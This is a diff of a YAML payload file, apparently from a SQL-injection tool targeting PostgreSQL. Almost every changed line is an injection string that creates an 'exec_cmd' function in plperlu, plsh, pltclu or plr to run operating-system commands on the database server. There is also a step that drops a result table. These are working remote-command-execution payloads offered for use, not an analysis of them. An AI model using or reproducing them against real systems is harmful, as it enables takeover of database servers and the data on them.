@@ -165,12 +165,11 @@ resource:
         return c(cmd.split('%%20')).decode()%%0a
       $$%%20language %s
     
-    plperlu: |
-      ; create or replace function exec_cmd(text) returns text as 'return `$_[0]`' language plperlu
-    
-    plsh: |
-      ; create or replace function exec_cmd(text) returns text as '%23!/bin/sh%0a
-        $1' language plsh
+    plperl: ; create or replace function exec_cmd(text) returns text as 'return `$_[0]`' language plperlu
+    plsh: ; create or replace function exec_cmd(text) returns text as '%23!/bin/sh%0a$1' language plsh
+    pltcl: ; create or replace function exec_cmd(text) returns text as 'eval exec%20"$1"' language pltclu
+    # failing on multiple args 'ls -l'
+    plr: ; create or replace function exec_cmd(cmd text) returns text as 'system2(cmd, stdout=TRUE, stderr=TRUE)' language plr
     
     sql:
       dropTable: ; drop table if exists cmd_result
